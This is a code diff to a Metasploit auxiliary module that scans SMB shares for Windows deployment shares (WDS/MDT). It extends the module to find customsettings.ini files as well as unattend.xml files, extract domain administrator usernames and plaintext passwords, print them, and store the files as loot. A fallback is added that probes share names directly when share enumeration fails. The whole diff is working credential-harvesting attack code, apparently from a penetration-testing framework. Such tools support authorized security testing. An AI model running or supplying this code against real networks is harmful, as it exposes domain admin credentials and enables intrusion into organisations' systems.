@@ -5,6 +5,7 @@
 
 require 'rex/proto/dcerpc'
 require 'rex/parser/unattend'
+require 'rex/parser/ini'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client
@@ -139,20 +140,28 @@ class MetasploitModule < Msf::Auxiliary
     begin
       connect
       smb_login
+      begin
       srvsvc_netshareenum.each do |share|
         # Ghetto unicode to ascii conversation
         share_name = share[0].unpack("v*").pack("C*").split("\x00").first
         share_comm = share[2].unpack("v*").pack("C*").split("\x00").first
         share_type = share[1]
 
-        if share_type == "DISK" && (share_name == "REMINST" || share_comm == "MDT Deployment Share")
+        if share_type == "DISK" && (share_name == "REMINST" || share_name == "DeploymentShare$" || share_comm == "MDT Deployment Share")
           vprint_good("Identified deployment share #{share_name} #{share_comm}")
           deploy_shares << share_name
         end
       end
-
       deploy_shares.each do |deploy_share|
         query_share(deploy_share)
+      end
+      #in case dcerpc enum fails, try to map the shares anyway
+      rescue
+        deploy_shares << "REMINST"
+        deploy_shares << "DeploymentShare$"
+        deploy_shares.each do |deploy_share|
+          query_share(deploy_share)
+	end
       end
 
     rescue ::Interrupt
@@ -171,13 +180,37 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    results = simple.client.file_search("\\", /unattend.xml$/i, 10)
+    unattend_results = simple.client.file_search("\\", /unattend.xml$/i, 10)
+    customsettings_results = simple.client.file_search("\\", /customsettings.ini$/i, 10)
 
-    results.each do |file_path|
+    customsettings_results.each do |file_path|
+      file = simple.open(file_path, 'ro')
+      data = file.read()
+      file.close
+      next unless data
+      ini = Rex::Parser::Ini.from_s(data)
+      ini.each_key do |group|
+        domain = ini[group]['DomainAdminDomain']
+        username = ini[group]['DomainAdmin']
+        password = ini[group]['DomainAdminPassword']
+      
+	if domain.to_s.length > 0 && username.to_s.length > 0 && password.to_s.length > 0
+          loot_file(data,file_path)
+          print_good("Credentials: " +
+            "Path=#{share_path}#{file_path} " +
+	    "Username=#{domain}\\#{username} " +
+	    "Password=#{password}"
+          )
+        end
+      end
+    end
+
+
+    unattend_results.each do |file_path|
       file = simple.open(file_path, 'o').read()
       next unless file
 
-      loot_unattend(file)
+      loot_file(file,file_path)
 
       creds = parse_client_unattend(file)
       creds.each do |cred|
@@ -193,8 +226,8 @@ class MetasploitModule < Msf::Auxiliary
         )
       end
     end
-
   end
+
 
   def report_cred(opts)
     service_data = {
@@ -233,10 +266,10 @@ class MetasploitModule < Msf::Auxiliary
     Rex::Parser::Unattend.parse(xml).flatten
   end
 
-  def loot_unattend(data)
+  def loot_file(data,file)
     return if data.empty?
-    path = store_loot('windows.unattend.raw', 'text/plain', rhost, data, "Windows Deployment Services")
-    print_good("Stored unattend.xml in #{path}")
+    path = store_loot("windows.#{file}.raw", 'text/plain', rhost, data, "WDS/MDT")
+    print_good("Stored #{file} in #{path}")
   end
 
   def report_creds(domain, user, pass)
